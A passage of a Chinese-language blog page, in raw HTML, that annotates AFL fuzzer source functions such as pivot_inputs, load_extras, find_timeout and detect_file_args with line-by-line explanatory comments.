let&#x27;s</span><br><span class="hljs-comment">     append it if we have room. Otherwise, let&#x27;s randomly evict some other</span><br><span class="hljs-comment">     entry from the bottom half of the list. */</span><br><br>  <span class="hljs-comment">// 发现了一个新的entry</span><br>  <span class="hljs-keyword">if</span> (a_extras_cnt &lt; MAX_AUTO_EXTRAS) &#123; <span class="hljs-comment">// 若a_extras_cnt &lt; 500</span><br><br>    a_extras = ck_realloc_block(a_extras, (a_extras_cnt + <span class="hljs-number">1</span>) *<br>                                <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> extra_data));     <span class="hljs-comment">// 为发现的new extra分配空间</span><br><br>    a_extras[a_extras_cnt].data = ck_memdup(mem, len);<br>    a_extras[a_extras_cnt].len  = len;<br>    a_extras_cnt++;<br><br>  &#125; <span class="hljs-keyword">else</span> &#123;      <span class="hljs-comment">// 否则随机覆盖一个a_extra</span><br><br>    i = MAX_AUTO_EXTRAS / <span class="hljs-number">2</span> +<br>        UR((MAX_AUTO_EXTRAS + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>);<br><br>    ck_free(a_extras[i].data);<br><br>    a_extras[i].data    = ck_memdup(mem, len);<br>    a_extras[i].len     = len;<br>    a_extras[i].hit_cnt = <span class="hljs-number">0</span>;<br><br>  &#125;<br><br>sort_a_extras:<br><br>  <span class="hljs-comment">/* First, sort all auto extras by use count, descending order. */</span><br><br>  qsort(a_extras, a_extras_cnt, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> extra_data),<br>        compare_extras_use_d);  <span class="hljs-comment">// 快排，按照使用次数，降序排列</span><br><br>  <span class="hljs-comment">/* Then, sort the top USE_AUTO_EXTRAS entries by size. */</span><br><br>  qsort(a_extras, MIN(USE_AUTO_EXTRAS, a_extras_cnt),<br>        <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> extra_data), compare_extras_len); <span class="hljs-comment">// 按size进行排序</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h3><p>为测试用例在output文件夹中创建硬链接。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Create hard links for input test cases in the output directory, choosing</span><br><span class="hljs-comment">   good names and pivoting accordingly. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">pivot_inputs</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>* <span class="hljs-title">q</span> =</span> <span class="hljs-built_in">queue</span>;<br>  u32 id = <span class="hljs-number">0</span>;<br><br>  ACTF(<span class="hljs-string">&quot;Creating hard links for all input files...&quot;</span>);<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    testcase -&gt; id:000000,orig:testcase</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">while</span> (q) &#123;   <span class="hljs-comment">// 遍历queue数组</span><br><br>    u8  *nfn, *rsl = <span class="hljs-built_in">strrchr</span>(q-&gt;fname, <span class="hljs-string">&#x27;/&#x27;</span>);    <span class="hljs-comment">// 获取q-&gt;fname最后一个&#x27;/&#x27;后的字符串</span><br>    u32 orig_id;<br><br>    <span class="hljs-keyword">if</span> (!rsl) rsl = q-&gt;fname; <span class="hljs-keyword">else</span> rsl++;       <span class="hljs-comment">// 若rsl为空，则直接设置rsl为q-&gt;fname,否则忽略掉&#x27;/&#x27;</span><br><br>    <span class="hljs-comment">/* If the original file name conforms to the syntax and the recorded</span><br><span class="hljs-comment">       ID matches the one we&#x27;d assign, just use the original file name.</span><br><span class="hljs-comment">       This is valuable for resuming fuzzing runs. */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SIMPLE_FILES</span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> CASE_PREFIX <span class="hljs-string">&quot;id:&quot;</span>     <span class="hljs-comment">// 定义前缀为&quot;id:&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-meta">#  <span class="hljs-keyword">define</span> CASE_PREFIX <span class="hljs-string">&quot;id_&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^!SIMPLE_FILES */</span></span><br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(rsl, CASE_PREFIX, <span class="hljs-number">3</span>) &amp;&amp;<br>        <span class="hljs-built_in">sscanf</span>(rsl + <span class="hljs-number">3</span>, <span class="hljs-string">&quot;%06u&quot;</span>, &amp;orig_id) == <span class="hljs-number">1</span> &amp;&amp; orig_id == id) &#123;      <span class="hljs-comment">// 若rsl存在前缀，将id:后的序号赋给orig_id，判断orig_id == id</span><br><br>      u8* src_str;<br>      u32 src_id;<br><br>      resuming_fuzz = <span class="hljs-number">1</span>;        <span class="hljs-comment">// 设置resuming_fuzz = 1，表示重启的fuzz</span><br>      nfn = alloc_printf(<span class="hljs-string">&quot;%s/queue/%s&quot;</span>, out_dir, rsl);  <span class="hljs-comment">// nfn = out_dir/queue/rsl</span><br><br>      <span class="hljs-comment">/* Since we&#x27;re at it, let&#x27;s also try to find parent and figure out the</span><br><span class="hljs-comment">         appropriate depth for this entry. */</span><br><br>      src_str = <span class="hljs-built_in">strchr</span>(rsl + <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;:&#x27;</span>);  <span class="hljs-comment">// 查找字符&#x27;:&#x27;</span><br>      <br> <br>      <span class="hljs-keyword">if</span> (src_str &amp;&amp; <span class="hljs-built_in">sscanf</span>(src_str + <span class="hljs-number">1</span>, <span class="hljs-string">&quot;%06u&quot;</span>, &amp;src_id) == <span class="hljs-number">1</span>) &#123;       <span class="hljs-comment">// 将rsl序号赋值给src_id，串联起queue</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span>* <span class="hljs-title">s</span> =</span> <span class="hljs-built_in">queue</span>;<br>        <span class="hljs-keyword">while</span> (src_id-- &amp;&amp; s) s = s-&gt;next;<br>        <span class="hljs-keyword">if</span> (s) q-&gt;depth = s-&gt;depth + <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">if</span> (max_depth &lt; q-&gt;depth) max_depth = q-&gt;depth;<br><br>      &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>      <span class="hljs-comment">/* No dice - invent a new name, capturing the original one as a</span><br><span class="hljs-comment">         substring. */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SIMPLE_FILES</span><br><br>      u8* use_name = <span class="hljs-built_in">strstr</span>(rsl, <span class="hljs-string">&quot;,orig:&quot;</span>);     <span class="hljs-comment">// 在rsl中查找,orig:</span><br><br>      <span class="hljs-keyword">if</span> (use_name) use_name += <span class="hljs-number">6</span>; <span class="hljs-keyword">else</span> use_name = rsl; <span class="hljs-comment">// 若存在，设置use_name为use_name+6, 否则直接设置为rsl</span><br>      nfn = alloc_printf(<span class="hljs-string">&quot;%s/queue/id:%06u,orig:%s&quot;</span>, out_dir, id, use_name);    <span class="hljs-comment">// out_dir/queue/id:id,orig:use_name</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>      nfn = alloc_printf(<span class="hljs-string">&quot;%s/queue/id_%06u&quot;</span>, out_dir, id);<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^!SIMPLE_FILES */</span></span><br><br>    &#125;<br><br>    <span class="hljs-comment">/* Pivot to the new queue entry. */</span><br><br>    link_or_copy(q-&gt;fname, nfn);        <span class="hljs-comment">// 创建q-fname文件的硬链接</span><br>    ck_free(q-&gt;fname);<br>    q-&gt;fname = nfn;<br><br>    <span class="hljs-comment">/* Make sure that the passed_det value carries over, too. */</span><br><br>    <span class="hljs-keyword">if</span> (q-&gt;passed_det) mark_as_det_done(q);     <span class="hljs-comment">// 若q-&gt;passed_det不为空，标记queue已经fuzz过了，并保持q-&gt;passed_det为1</span><br><br>    q = q-&gt;next;<br>    id++;<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (in_place_resume) nuke_resume_dir();       <span class="hljs-comment">// 若in_placce_resume不为空，调用nuke_resume_dir删除out_dir/_resume目录下所有内容，</span><br>                                                <span class="hljs-comment">// 若有一个删除失败，报错并退出</span><br><br>&#125;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SIMPLE_FILES</span><br></code></pre></td></tr></table></figure><h3 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras"></a>load_extras</h3><p>若extras_dir不为空(通过<code>-x</code>参数指定)，加载目录下的token到extras数组，并按照大小排序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Read extras from the extras directory and sort them by size. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">load_extras</span><span class="hljs-params">(u8* dir)</span> &#123;<br><br>  DIR* d;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span>* <span class="hljs-title">de</span>;</span><br>  u32 min_len = MAX_DICT_FILE, max_len = <span class="hljs-number">0</span>, dict_level = <span class="hljs-number">0</span>;<br>  u8* x;<br><br>  <span class="hljs-comment">/* If the name ends with @, extract level and continue. */</span><br><br>  <span class="hljs-keyword">if</span> ((x = <span class="hljs-built_in">strchr</span>(dir, <span class="hljs-string">&#x27;@&#x27;</span>))) &#123; <span class="hljs-comment">// 检测dir中是否存在@</span><br><br>    *x = <span class="hljs-number">0</span>;     <span class="hljs-comment">// 将@替换为空字节</span><br>    dict_level = atoi(x + <span class="hljs-number">1</span>);   <span class="hljs-comment">// 将@后的数字转换为int型</span><br><br>  &#125;<br><br>  ACTF(<span class="hljs-string">&quot;Loading extra dictionary from &#x27;%s&#x27; (level %u)...&quot;</span>, dir, dict_level);<br><br>  d = opendir(dir);     <span class="hljs-comment">// 打开dir文件夹</span><br><br>  <span class="hljs-keyword">if</span> (!d) &#123;     <span class="hljs-comment">// 若打开失败</span><br><br>    <span class="hljs-keyword">if</span> (errno == ENOTDIR) &#123;     <span class="hljs-comment">// 若报错信息为ENOTDIR，表示不是一个目录</span><br>      load_extras_file(dir, &amp;min_len, &amp;max_len, dict_level);    <span class="hljs-comment">// 打开dir文件</span><br>      <span class="hljs-keyword">goto</span> check_and_sort;      <span class="hljs-comment">// 跳转到check_and_sort</span><br>    &#125;<br><br>    PFATAL(<span class="hljs-string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, dir);<br><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (x) FATAL(<span class="hljs-string">&quot;Dictionary levels not supported for directories.&quot;</span>);<br><br>  <span class="hljs-keyword">while</span> ((de = readdir(d))) &#123;   <span class="hljs-comment">// 循环遍历dir目录</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br>    u8* fn = alloc_printf(<span class="hljs-string">&quot;%s/%s&quot;</span>, dir, de-&gt;d_name);<br>    s32 fd;<br><br>    <span class="hljs-keyword">if</span> (lstat(fn, &amp;st) || access(fn, R_OK))     <span class="hljs-comment">// 判断文件是否存在，将文件信息保存到stat结构体中</span><br>      PFATAL(<span class="hljs-string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);<br><br>    <span class="hljs-comment">/* This also takes care of . and .. */</span><br>    <span class="hljs-keyword">if</span> (!S_ISREG(st.st_mode) || !st.st_size) &#123;  <span class="hljs-comment">// </span><br><br>      ck_free(fn);<br>      <span class="hljs-keyword">continue</span>;<br><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (st.st_size &gt; MAX_DICT_FILE)     <span class="hljs-comment">// 若文件大小大于MAX_DICT_FILE，报错并退出</span><br>      FATAL(<span class="hljs-string">&quot;Extra &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,<br>            DMS(st.st_size), DMS(MAX_DICT_FILE));<br><br>    <span class="hljs-keyword">if</span> (min_len &gt; st.st_size) min_len = st.st_size;     <span class="hljs-comment">// 根据文件大小设置min_len与max_Len</span><br>    <span class="hljs-keyword">if</span> (max_len &lt; st.st_size) max_len = st.st_size;<br><br>    extras = ck_realloc_block(extras, (extras_cnt + <span class="hljs-number">1</span>) *<br>               <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> extra_data));      <span class="hljs-comment">// 为extras重分配空间</span><br><br>    extras[extras_cnt].data = ck_alloc(st.st_size);     <span class="hljs-comment">// 为extra.data分配空间</span><br>    extras[extras_cnt].len  = st.st_size;<br><br>    fd = open(fn, O_RDONLY);    <span class="hljs-comment">// 打开文件</span><br><br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, fn);      <span class="hljs-comment">// 若打开失败，退出并返回</span><br><br>    ck_read(fd, extras[extras_cnt].data, st.st_size, fn);       <span class="hljs-comment">// 读取文件内容到extras数组中</span><br><br>    close(fd);  <span class="hljs-comment">// 关闭文件</span><br>    ck_free(fn);<br><br>    extras_cnt++;       <span class="hljs-comment">// 继续遍历下一个文件</span><br><br>  &#125;<br><br>  closedir(d);  <span class="hljs-comment">// 关闭目录</span><br><br>check_and_sort:<br><br>  <span class="hljs-keyword">if</span> (!extras_cnt) FATAL(<span class="hljs-string">&quot;No usable files in &#x27;%s&#x27;&quot;</span>, dir);<br><br>  qsort(extras, extras_cnt, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> extra_data), compare_extras_len);     <span class="hljs-comment">// 将extras按照len排序</span><br><br>  OKF(<span class="hljs-string">&quot;Loaded %u extra tokens, size range %s to %s.&quot;</span>, extras_cnt,<br>      DMS(min_len), DMS(max_len));<br><br>  <span class="hljs-keyword">if</span> (max_len &gt; <span class="hljs-number">32</span>)<br>    WARNF(<span class="hljs-string">&quot;Some tokens are relatively large (%s) - consider trimming.&quot;</span>,<br>          DMS(max_len));<br><br>  <span class="hljs-keyword">if</span> (extras_cnt &gt; MAX_DET_EXTRAS)<br>    WARNF(<span class="hljs-string">&quot;More than %u tokens - will use them probabilistically.&quot;</span>,<br>          MAX_DET_EXTRAS);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h3><p>若<code>timeout_given</code>(通过<code>-t</code>参数指定)不为空，设置<code>exec_tmout</code>为fuzzer_stats文件中的<code>exec_tmout</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The same, but for timeouts. The idea is that when resuming sessions without</span><br><span class="hljs-comment">   -t given, we don&#x27;t want to keep auto-scaling the timeout over and over</span><br><span class="hljs-comment">   again to prevent it from growing due to random flukes. */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">find_timeout</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  <span class="hljs-type">static</span> u8 tmp[<span class="hljs-number">4096</span>]; <span class="hljs-comment">/* Ought to be enough for anybody. */</span><br><br>  u8  *fn, *off;<br>  s32 fd, i;<br>  u32 ret;<br><br>  <span class="hljs-keyword">if</span> (!resuming_fuzz) <span class="hljs-keyword">return</span>;   <span class="hljs-comment">// 若resuming_fuzz为空，直接返回</span><br>  <br>  <span class="hljs-comment">// in_place_resume通过-i参数设置</span><br>  <span class="hljs-keyword">if</span> (in_place_resume) fn = alloc_printf(<span class="hljs-string">&quot;%s/fuzzer_stats&quot;</span>, out_dir);   <span class="hljs-comment">// 若in_place_resume不为空，out_dir/fuzzer_stats</span><br>  <span class="hljs-keyword">else</span> fn = alloc_printf(<span class="hljs-string">&quot;%s/../fuzzer_stats&quot;</span>, in_dir); <span class="hljs-comment">// in_dir/../fuzzer_stats</span><br><br>  fd = open(fn, O_RDONLY);      <span class="hljs-comment">// 打开fn文件</span><br>  ck_free(fn);<br><br>  <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;<br><br>  i = read(fd, tmp, <span class="hljs-keyword">sizeof</span>(tmp) - <span class="hljs-number">1</span>); (<span class="hljs-type">void</span>)i; <span class="hljs-comment">/* Ignore errors */</span><br>                                           <span class="hljs-comment">/*这个操作的目的是为了防止编译器发出未使用变量 i 的警告。</span><br><span class="hljs-comment">                                            因为代码中没有进一步使用 i，所以可以使用 (void) 来明确</span><br><span class="hljs-comment">                                            告诉编译器我们不打算使用它的值。*/</span><br>  close(fd);<br><br>  off = <span class="hljs-built_in">strstr</span>(tmp, <span class="hljs-string">&quot;exec_timeout      : &quot;</span>);    <span class="hljs-comment">// 提取fuzzer_stats文件中的exex_timeout作为exec_timeout</span><br>  <span class="hljs-keyword">if</span> (!off) <span class="hljs-keyword">return</span>;<br><br>  ret = atoi(off + <span class="hljs-number">20</span>);<br>  <span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">4</span>) <span class="hljs-keyword">return</span>;<br><br>  exec_tmout = ret;<br>  timeout_given = <span class="hljs-number">3</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h3><p>检测argv中是否存在@@，替换成out_dir&#x2F;.cur_input。其中out_file参数可通过命令行参数<code>-f</code>设置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Detect @@ in args. */</span><br><br>EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">detect_file_args</span><span class="hljs-params">(<span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  u32 i = <span class="hljs-number">0</span>;<br>  u8* cwd = getcwd(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);    <span class="hljs-comment">// 获取当前文件路径</span><br><br>  <span class="hljs-keyword">if</span> (!cwd) PFATAL(<span class="hljs-string">&quot;getcwd() failed&quot;</span>);<br><br>  <span class="hljs-keyword">while</span> (argv[i]) &#123;     <span class="hljs-comment">// 遍历argv参数</span><br><br>    u8* aa_loc = <span class="hljs-built_in">strstr</span>(argv[i], <span class="hljs-string">&quot;@@&quot;</span>); <span class="hljs-comment">// 查找参数是否包含@@</span><br><br>    <span class="hljs-keyword">if</span> (aa_loc) &#123;       <span class="hljs-comment">// 若包含@@，则</span><br><br>      u8 *aa_subst, *n_arg;<br><br>      <span class="hljs-comment">/* If we don&#x27;t have a file name chosen yet, use a safe default. */</span><br><br>      <span class="hljs-keyword">if</span> (!out_file)    <span class="hljs-comment">// 通过命令行参数-f设置</span><br>        out_file = alloc_printf(<span class="hljs-string">&quot;%s/.cur_input&quot;</span>, out_dir);      <span class="hljs-comment">// out_dir/.cur_input</span><br><br>      <span class="hljs-comment">/* Be sure that we&#x27;re always using fully-qualified paths. */</span><br><br>      <span class="hljs-keyword">if</span> (out_file[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;/&#x27;</span>) aa_subst = out_file;      <span class="hljs-comment">// 判断路径是否以&quot;/&quot;开始，猜测判断是否为绝对路径</span><br>      <span class="hljs-keyword">else</span> aa_subst = alloc_printf(<span class="hljs-string">&quot;%s/%s&quot;</span>, cwd, out_file);<br><br>      <span class="hljs-comment">/* Construct a replacement argv value. */</span><br><br>      *aa_loc = <span class="hljs-number">0</span>;<br>      n_arg = alloc_printf(<span class="hljs-string">&quot;%s%s%s&quot;</span>, argv[i], aa_subst, aa_loc + <span class="hljs-number">2</span>);    <span class="hljs-comment">// 替换argv中@@为.cur_input文件</span><br>      argv[i] = n_arg;<br>      *aa_loc = <span class="hljs-string">&#x27;@&#x27;</span>;<br><br>      <span class="hljs-keyword">if</span> (out_file[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;/&#x27;</span>) ck_free(aa_subst);<br><br>    &#125;<br><br>    i++;<br><br>  &#125;<br><br>  <span class="hljs-built_in">free</span>(cwd); <span class="hljs-comment">/* not tracked */</span><br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="setup-stdio-file"><a href="#setup-stdio-file" class="headerlink" title="setup_stdio_file"></a>setup_stdio_file</h3><p>若没有设置<code>-f</code>命令行参数，则创建一个新的<code>out_dir/.cur_input</code>文件并打开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Setup the output file for fuzzed data, if not using -f. */</span><br><br>EXP_ST <span class="hljs-type">void</span> <span class="hljs-title function_">setup_stdio_file</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br><br>  u8* fn = alloc_printf(<span class="hljs-string">&quot;%s/.cur_input&quot;</span>, out_dir);      <span class="hljs-comment">// out_dir/.cur_input</span><br><br>  unlink(fn); <span class="hljs-comment">/* Ignore errors */</span>       <span class="hljs-comment">// 删除原来的out_dir/.cur_input</span><br><br>  out_fd = open(fn, O_RDWR | O_CREAT | O_EXCL, <span class="hljs-number">0600</span>);   <span class="hljs-comment">// 打开out_dir/.cur_input</span><br><br>  <span class="hljs-keyword">if</span> (out_fd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to create &#x27;%s&#x27;&quot;</span>, fn);<br><br>  ck_free(fn);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary"></a>check_binary</h3><p>检测指定路径的二进制文件是否存在，是否为shell脚本，是否是elf文件格式，是否被插桩</p><h3 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run"></a>perform_dry_run</h3><p>执行所有的测试用例，检测是否正常执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 